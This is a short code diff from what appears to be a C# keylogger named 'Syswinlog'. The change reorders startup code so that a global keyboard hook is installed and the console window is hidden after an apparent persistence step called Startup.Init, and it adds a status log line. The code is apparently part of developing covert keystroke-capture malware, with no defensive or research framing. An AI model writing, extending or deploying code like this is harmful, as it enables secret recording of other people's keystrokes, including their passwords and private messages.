@@ -28,12 +28,11 @@ namespace Syswinlog
                 Application.Exit();
             }
 
-            _hookptr = SetHook(KeyBoardProcCallback);
-            SetConsoleWindow(
-                Constants.ConsoleWindowState.SW_HIDE
-            );
-
             Startup.Init();
+            StatusLog.Log("Started...");
+
+            _hookptr = SetHook(KeyBoardProcCallback);
+            SetConsoleWindow(Constants.ConsoleWindowState.SW_HIDE);
 
             Application.Run();
             NativeMethods.UnhookWindowsHookEx(_hookptr);
